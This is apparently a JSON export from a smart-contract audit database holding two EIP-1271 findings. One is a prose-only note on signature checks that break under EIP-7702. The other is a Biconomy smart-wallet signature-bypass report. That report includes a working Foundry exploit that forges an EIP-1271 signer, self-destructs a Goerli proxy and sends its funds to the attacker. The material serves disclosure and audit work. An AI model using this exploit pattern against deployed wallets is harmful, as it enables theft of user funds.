{
  "tag": "EIP-1271",
  "count": 2,
  "metadata": {
    "totalResults": 2,
    "totalPages": 1
  },
  "last_rateLimit": {
    "limit": 20,
    "remaining": 14,
    "reset": 1771761000
  },
  "findings": [
    {
      "id": "57707",
      "kind": "MARKDOWN",
      "auditfirm_id": "32",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "3080",
      "title": "[M-01] SignatureVerification BrokenUnderEIP-7702DuetoRelianceonisContractLogic",
      "content": "## Severity\n\nMedium\n\n## Description\n\nIn the FactCheckExchange.sol contract,the settleMatchedOrders() function attempts to\nvalidate orders using signatures by distinguishing EOAs from contracts. It uses the following logic:\n\n-If the address has code (isContract returns true), it calls isValidSignature() via ERC-1271.\n-If the address has no code, it assumes itâ€™s an EOA and uses ECDSA.recover() to verify the signature.\n\nThis approach breaks under the upcoming Ethereum Pectra upgrade, which includes EIP-7702. EIP\n7702 allows EOAs to temporarily attach code during a transaction, meaning any externally owned\naccount can now appear as a contract at runtime.\nAs aresult:\nA 7702-enabled EOA with temporary code will cause the logic to treat it as a contract.\nIf the code does not implement ERC-1271,the isValidSignature() call will fail.\nThe logic does not fall back to ECDSA.recover(), causing legitimate EOA signatures to be rejected\n\n## Team Response\n\nFixed.",
      "summary": "\nThe FactCheckExchange.sol contract has a function called settleMatchedOrders() that is used to validate orders using signatures. This function checks if the address is a contract or an externally owned account (EOA) and uses different methods to verify the signature. However, with the upcoming Ethereum Pectra upgrade, this logic will break because of a new feature called EIP-7702. This feature allows EOAs to temporarily attach code during a transaction, making them appear as contracts at runtime. As a result, the function will mistakenly treat these EOAs as contracts and fail to validate the signature. This bug has been fixed by the team.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 4.5,
      "source_link": "https://github.com/Kann-Audits/Kann-Audits/blob/main/reports/md-format/private-audits-reports/FactcheckDotFun.md",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "m-01-signatureverification-brokenundereip-7702duetorelianceoniscontractlogic-kann-none-factcheckdotfun-markdown",
      "firm_name": "Kann",
      "firm_logo_square": "Kann_Audits_square.png",
      "protocol_name": "FactcheckDotFun",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Kann",
        "logo_square": "Kann_Audits_square.png"
      },
      "protocols_protocol": {
        "name": "FactcheckDotFun",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "EIP-1271"
          }
        }
      ]
    },
    {
      "id": "6443",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 27,
      "protocol_id": "271",
      "title": "[H-04] Arbitrary transactions possible due to insufficient signature validation",
      "content": "\nA hacker can create arbitrary transaction through the smart wallet by evading signature validation.\n\nMajor impacts:\n\n1.  Steal **all** funds from the smart wallet and destroy the proxy\n2.  Lock the wallet from EOAs by updating the implementation contract\n    1.  New implementation can transfer all funds or hold some kind of ransom\n    2.  New implementation can take time to unstake funds from protocols\n\n### Proof of Concept\n\nThe protocol supports contract signed transactions (eip-1271). The support is implemented in the `checkSignature` call when providing a transaction:<br>\n[contracts/smart-contract-wallet/SmartAccount.sol#L218](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L218)<br>\n[contracts/smart-contract-wallet/SmartAccount.sol#L342](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342)\n\n\n    function execTransaction(\n            Transaction memory _tx,\n            uint256 batchId,\n            FeeRefund memory refundInfo,\n            bytes memory signatures\n        ) public payable virtual override returns (bool success) {\n    ---------\n                checkSignatures(txHash, txHashData, signatures);\n            }\n    ---------\n                success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n    ---------\n            }\n        }\n\n    function checkSignatures(\n            bytes32 dataHash,\n            bytes memory data,\n            bytes memory signatures\n        ) public view virtual {\n    ----------\n            if(v == 0) {\n    ----------\n                _signer = address(uint160(uint256(r)));\n    ----------\n                    require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n    ----------\n                    require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n    -----------\n                    assembly {\n                        contractSignatureLen := mload(add(add(signatures, s), 0x20))\n                    }\n                    require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n    -----------\n                    require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n    -----------\n        }\n\n`checkSignature` **DOES NOT** Validate that the `_signer` or caller is the owner of the contract.\n\nA hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled `_signer` that always return `EIP1271_MAGIC_VALUE` from the `isValidSignature` function.\n\nAs `isValidSignature` returns `EIP1271_MAGIC_VALUE` and passed the requirements, the function `checkSignatures` returns gracefully and the transaction execution will continue. Arbitrary transactions can be set by the hacker.\n\n**Impact #1 - Self destruct and steal all funds**\n\nConsider the following scenario:\n\n1.  Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`\n2.  Hacker creates `SelfDestructingContract` that `selfdestruct`s when called\n3.  Hacker calls the smart wallets `execTransaction` function\n    1.  The transaction set will delegatecall to the `SelfDestructingContract` function to `selfdestruct`\n    2.  The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`\n4.  Proxy contract is destroyed\n    1.  Hacker received all funds that were in the wallet\n\n**Impact #2 - Update implementation and lock out EOA**\n\n1.  Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`\n2.  Hacker creates `MaliciousImplementation` that is fully controlled **ONLY** by the hacker\n3.  Hacker calls the smart wallets `execTransaction` function\n    1.  The transaction set will call to the the contracts `updateImplementation` function to update the implementation to `MaliciousImplementation`. This is possible because `updateImplementation` permits being called from `address(this)`\n    2.  The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`\n4.  Implementation was updated to `MaliciousImplementation`\n    1.  Hacker transfers all native and ERC20 tokens to himself\n    2.  Hacker unstakes EOA funds from protocols\n    3.  Hacker might try to ransom the protocol/EOAs to return to previous implementation\n5.  Proxy cannot be redeployed for the existing EOA\n\n**Foundry POC**\n\nThe POC will demonstrate impact #1. It will show that the proxy does not exist after the attack and EOAs cannot interact with the wallet.\n\nThe POC was built using the Foundry framework which allowed me to validate the vulnerability against the state of deployed contract on goerli (Without interacting with them directly). This was approved by the sponsor.\n\nThe POC use a smart wallet proxy contract that is deployed on `goerli` chain:<br>\n`proxy: 0x11dc228AB5BA253Acb58245E10ff129a6f281b09`\n\nYou will need to install a foundry. Please follow these instruction for the setup: <https://book.getfoundry.sh/getting-started/installation>\n\nAfter installing, create a workdir by issuing the command: `forge init --no-commit`\n\nCreate the following file in `test/DestroyWalletAndStealFunds.t.sol`:\n\n    // SPDX-License-Identifier: UNLICENSED\n    pragma solidity ^0.8.13;\n\n    import \"forge-std/Test.sol\";\n\n    contract Enum {\n        enum Operation {Call, DelegateCall}\n    }\n    interface SmartAccount {\n        function execTransaction(\n            Transaction memory _tx,\n            uint256 batchId,\n            FeeRefund memory refundInfo,\n            bytes memory signatures\n        ) external payable returns (bool success); \n        function getNonce(uint256 batchId) external view returns (uint256);\n    }\n    struct Transaction {\n            address to;\n            uint256 value;\n            bytes data;\n            Enum.Operation operation;\n            uint256 targetTxGas;\n        }\n    struct FeeRefund {\n            uint256 baseGas;\n            uint256 gasPrice; //gasPrice or tokenGasPrice\n            uint256 tokenGasPriceFactor;\n            address gasToken;\n            address payable refundReceiver;\n        }\n    contract FakeSigner {\n        bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;\n\n        // Always return valid EIP1271_MAGIC_VALUE\n        function isValidSignature(bytes memory data, bytes memory contractSignature) external returns (bytes4) {\n            return EIP1271_MAGIC_VALUE;\n        }\n    }\n    contract SelfDestructingContract {\n        // All this does is self destruct and send funds to \"to\"\n        function selfDestruct(address to) external {\n            selfdestruct(payable(to));\n        }\n    }\n\n    contract DestroyWalletAndStealFunds is Test {\n        SmartAccount proxySmartAccount = SmartAccount(0x11dc228AB5BA253Acb58245E10ff129a6f281b09);\n        address hacker = vm.addr(0x1337);\n        SelfDestructingContract sdc;\n        FakeSigner fs;\n        function setUp() public {\n            // Create self destruct contract\n            sdc = new SelfDestructingContract();\n            // Create fake signer\n            fs = new FakeSigner();\n\n            // Impersonate hacker\n            vm.startPrank(hacker);\n            // Create the calldata to call the selfDestruct function of SelfDestructingContract and send funds to hacker \n            bytes memory data = abi.encodeWithSelector(sdc.selfDestruct.selector, hacker);\n            // Create transaction specifing SelfDestructingContract as target and as a delegate call\n            Transaction memory transaction = Transaction(address(sdc), 0, data, Enum.Operation.DelegateCall, 1000000);\n            // Create FeeRefund\n            FeeRefund memory fr = FeeRefund(100, 100, 100, hacker, payable(hacker));\n\n            bytes32 fakeSignerPadded = bytes32(uint256(uint160(address(fs))));\n            // Add fake signature (r,s,v) to pass all requirments.\n            // v=0 to indicate eip-1271 signer \"fakeSignerPadded\" which will always return true\n            bytes memory signatures = abi.encodePacked(fakeSignerPadded, bytes32(uint256(65)),uint8(0), bytes32(0x0));\n            // Call execTransaction with eip-1271 signer to delegatecall to selfdestruct of the proxy contract.\n            proxySmartAccount.execTransaction(transaction, 0, fr, signatures);\n            vm.stopPrank();\n        }\n\n        function testProxyDoesNotExist() public {\n            uint size;\n            // Validate that bytecode size of the proxy contract is 0 becuase of self destruct \n            address proxy = address(proxySmartAccount);\n            assembly {\n              size := extcodesize(proxy)\n            }\n            assertEq(size,0);\n        }\n\n        function testRevertWhenCallingWalletThroughProxy() public {\n            // Revert when trying to call a function in the proxy \n            proxySmartAccount.getNonce(0);\n        }\n    }\n\nTo run the POC and validate that the proxy does not exist after destruction:\n\n    forge test -m testProxyDoesNotExist -v --fork-url=\"<GOERLI FORK RPC>\"\n\nExpected output:\n\n    Running 1 test for test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds\n    [PASS] testProxyDoesNotExist() (gas: 4976)\n    Test result: ok. 1 passed; 0 failed; finished in 4.51s\n\nTo run the POC and validate that the EOA cannot interact with the wallet after destruction:\n\n    forge test -m testRevertWhenCallingWalletThroughProxy -v --fork-url=\"<GOERLI FORK RPC>\"\n\nExpected output:\n\n    Failing tests:\n    Encountered 1 failing test in test/DestroyWalletAndStealFunds.t.sol:DestroyWalletAndStealFunds\n    [FAIL. Reason: EvmError: Revert] testRevertWhenCallingWalletThroughProxy() (gas: 5092)\n\n### Tools Used\n\nFoundry, VS Code\n\n### Recommended Mitigation Steps\n\nThe protocol should validate before calling `isValidSignature` that `_signer` is `owner`.\n\n**[livingrockrises (Biconomy) confirmed](https://github.com/code-423n4/2023-01-biconomy-findings/issues/175#issuecomment-1397655516)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the SmartAccount.sol contract, which is part of the code-423n4/2023-01-biconomy repository. The vulnerability allows a hacker to create arbitrary transactions by evading signature validation. This can lead to two major impacts: stealing all funds from the smart wallet and destroying the proxy, or locking the wallet from EOAs by updating the implementation contract.\n\nThe vulnerability is caused by the fact that the `checkSignature` function does not validate that the `_signer` or caller is the owner of the contract. A hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled `_signer` that always return `EIP1271_MAGIC_VALUE` from the `isValidSignature` function.\n\nThe proof of concept (POC) was built using the Foundry framework which allowed the bug to be validated against the state of deployed contract on goerli (without interacting with them directly). The POC will demonstrate the first impact, showing that the proxy does not exist after the attack and EOAs cannot interact with the wallet.\n\nThe recommended mitigation step is that the protocol should validate before calling `isValidSignature` that `_signer` is `owner`. The tools used for this bug report were Foundry and VS Code.",
      "report_date": {},
      "contest_prize_txt": "$60,500 USDC",
      "contest_link": "https://code4rena.com/contests/2023-01-biconomy-smart-contract-wallet-contest",
      "sponsor_name": "Biconomy",
      "sponsor_link": "https://twitter.com/biconomy",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2023-01-biconomy",
      "github_link": "https://github.com/code-423n4/2023-01-biconomy-findings/issues/175",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "200",
      "slug": "h-04-arbitrary-transactions-possible-due-to-insufficient-signature-validation-code4rena-biconomy-biconomy-smart-contract-wallet-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Biconomy",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Biconomy",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "EIP-1271"
          }
        }
      ]
    }
  ]
}